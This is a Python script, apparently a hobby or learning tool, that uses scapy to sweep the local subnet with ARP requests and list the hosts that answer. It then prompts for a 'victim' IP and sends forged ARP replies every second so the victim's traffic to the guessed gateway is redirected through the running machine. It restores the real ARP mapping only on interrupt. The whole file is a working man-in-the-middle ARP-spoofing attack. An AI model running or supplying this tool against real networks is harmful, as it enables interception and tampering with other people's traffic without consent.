
import time
import scapy.all as scapy
import subprocess
import argparse
import threading

arp_table = {}

def get_interface():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i" , "--interface" , dest = "interface" , help = "Specify interface name")
    options = parser.parse_args()

    if not options.interface:
        parser.error("[-] Specify interface name , for more info use --help option")
    
    return options.interface


def record_arp_internal(netmask , start , end):
    for i in range(start , end):
        dst_ip = netmask.replace('*' , str(i))
        arp_request_header = scapy.ARP(pdst = dst_ip)
        ether_header = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
        arp_request_packet = ether_header / arp_request_header
        answered_list = scapy.srp(arp_request_packet , timeout = 1 , verbose = False)[0]
        clients_list = []
    

        for elements in answered_list: 
            arp_table[elements[1].psrc] = elements[1].hwsrc

def construct_arp_table(netmask , num_threads):
    step = 254 // num_threads
    threads = []
    print("Start constructing ARP table.Please wait...")

    for i in range(1 , 255 , step):
        start = i
        end = start + step
        if end > 255:
            end = 255
        
        threads.append(threading.Thread(target = record_arp_internal , args = (netmask , start , end)))
    
    for curr in threads:
        curr.start()
    
    for curr in threads:
        curr.join()
    
    print("[+] Success")


def get_network_mask(interface):
    out = subprocess.check_output(['ifconfig' , interface]).decode().split('\n')
    want_line = ""
    for curr in out:
        if "inet" in curr:
            want_line = curr
            break
    assert(want_line != "" and "Something went wrong")

    start_template = "inet "
    start_pos = want_line.find(start_template) + len(start_template)
    end_pos = want_line.find(' ' , start_pos)
    my_ip = want_line[start_pos : end_pos]
    
    netmask = my_ip.split('.')
    netmask[-1] = "*"

    return '.'.join(netmask)



def get_victim_ip():
    print("\n\n")
    print("ARP Table:")
    for key , value in arp_table.items():
        print(f"\t{key} : {value}")
    
    print("\n")
    while True:
        try:
            print("Input ip address for attack: " , end = "")
            victim_ip = input()
            arp_table[victim_ip] #testing that ip containts in recorded arp_table , KeyError else
            break

        except:
            print("Incorrect input")

    return victim_ip

def to_default_gateway(ip):
    default_gateway = ip.split('.')
    default_gateway[-1] = "1"
    return '.'.join(default_gateway)



def spoof(victim_ip , gateway_ip):
    dst_mac = arp_table[victim_ip]

    arp_respond = scapy.ARP(op = 2 , pdst = victim_ip , hwdst = dst_mac , psrc = gateway_ip)
    scapy.send(arp_respond , verbose = False)

def restore(victim_ip , gateway_ip):
    dst_mac = arp_table[victim_ip]
    src_mac = arp_table[gateway_ip]

    arp_respond = scapy.ARP(op = 2 , pdst = victim_ip , hwdst = dst_mac , psrc = gateway_ip , hwsrc = src_mac)
    scapy.send(arp_respond , verbose = False , count = 4)

def main():
    interface = get_interface()
    netmask = get_network_mask(interface)
    construct_arp_table(netmask , 13)

    victim_ip = get_victim_ip()
    gateway_ip = to_default_gateway(victim_ip)

    try:
        while True:
            spoof(victim_ip , gateway_ip)
            time.sleep(1)
    except KeyboardInterrupt:
        restore(victim_ip , gateway_ip)

if __name__ == "__main__":
    main()



